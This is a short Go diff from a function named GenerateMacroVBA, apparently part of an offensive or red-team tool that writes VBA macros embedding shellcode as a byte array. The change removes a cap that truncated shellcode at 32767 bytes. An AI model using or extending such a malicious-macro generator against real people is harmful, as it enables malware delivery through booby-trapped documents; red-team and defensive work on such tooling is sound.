@@ -461,9 +461,6 @@ func GenerateMacroVBA(config MacroConfig) (string, error) {
 		if err != nil {
 			return "", fmt.Errorf("binary payload shellcode: %w", err)
 		}
-		if len(shellcode) > 32767 {
-			shellcode = shellcode[:32767]
-		}
 
 		sb.WriteString(fmt.Sprintf("    Dim %s(0 To %d) As Byte\n", scVar, len(shellcode)-1))
 		sb.WriteString(fmt.Sprintf("    Dim %s As LongPtr\n", ptrVar))
